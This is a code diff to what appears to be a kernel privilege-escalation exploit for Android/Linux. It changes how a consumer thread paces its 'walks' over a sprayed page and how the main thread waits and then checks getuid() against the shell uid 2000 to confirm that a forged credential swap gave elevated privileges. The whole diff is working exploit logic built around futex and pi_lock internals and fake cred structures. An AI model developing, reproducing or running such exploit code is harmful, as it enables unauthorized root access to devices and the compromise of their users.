@@ -357,7 +357,9 @@ void *consumer_thread(void *arg __attribute__((unused))) {
           write(1, dm, dn);
         }
         calls_this_seq++;
-        if (calls_this_seq >= ghost_plan_count()) {
+        // ponytail: 1 walk per overlay round -- waiter_update_prio clamps CAL_PRIO to 120, blocking walk 1's oracle
+        int round_budget = g_write_plans_active ? 1 : ghost_plan_count();
+        if (calls_this_seq >= round_budget) {
           atomic_store(&punch_consume_go, 0);
           /* Quiesce the spray page before the waiter's futex return path
            * walks it while holding hb->lock. Clear all tree roots, lock
@@ -513,36 +515,23 @@ void run_main_route_threads(void) {
   }
   reset_cpu_pin();
   if (pselect_custom_write == 6) {
-    uint32_t uid_orig = getuid();
-    uint32_t uid_spin = uid_orig;
-    /* Poll getuid with NO stdio (write(1) blocks on wedged hb->lock).
-     * Accept 0xffffff80 as "swap landed" (uid repair pending). */
-    for (int _i = 0; uid_spin == uid_orig && _i < 500000; _i++) {
-      __asm__ volatile("yield" ::: "memory");
-      uid_spin = syscall(__NR_getuid);
-    }
-    g_route_write_ok = (uid_spin != uid_orig);
-    /* Walk-before-cleanup: when a walk landed (uid changed to 0xffffff80
-     * -- the erase wrote the pc's high word into fake_cred.uid -- or to 0
-     * after a quiesce repair), wait (bounded) for the consumer to finish
-     * ALL planned erases plus the final quiesce before returning:
-     * run_cred_swap re-checks getuid() (the quiesce repairs the clobbered
-     * uid to 0), and the exec must not kill the consumer mid-walk while
-     * it holds the waiter's real pi_lock and the page spinlocks. The
-     * consumer signals consumer_walks_done only when every planned erase
-     * landed or the nice ladder is exhausted; each overlay-retry round
-     * takes up to SO_SNDTIMEO (3 s), so the bound covers several rounds. */
-    if (g_route_write_ok) {
+    /* Wait for consumer to finish ALL planned walks (budget=1 per round
+     * means multiple overlay rounds for multi-plan writes). Only then
+     * poll getuid -- the uid repair in the quiesce happens after the
+     * last erase, and the old poll expired before round 2 could fire. */
+    {
       struct timespec wd;
       clock_gettime(CLOCK_MONOTONIC, &wd);
-      while (!atomic_load(&consumer_walks_done) &&
-             atomic_load(&consumer_erase_hits) < g_write_plan_count) {
+      while (!atomic_load(&consumer_walks_done)) {
         struct timespec wn;
         clock_gettime(CLOCK_MONOTONIC, &wn);
-        if (wn.tv_sec - wd.tv_sec >= 12) break;
+        if (wn.tv_sec - wd.tv_sec >= 15) break;
         __asm__ volatile("yield" ::: "memory");
       }
     }
+    uint32_t uid_orig = 2000; /* shell uid, known a priori */
+    uint32_t uid_now = syscall(__NR_getuid);
+    g_route_write_ok = (uid_now != uid_orig);
   } else {
     while (!atomic_load_explicit(&route_done, memory_order_acquire))
       __asm__ volatile("yield" ::: "memory");
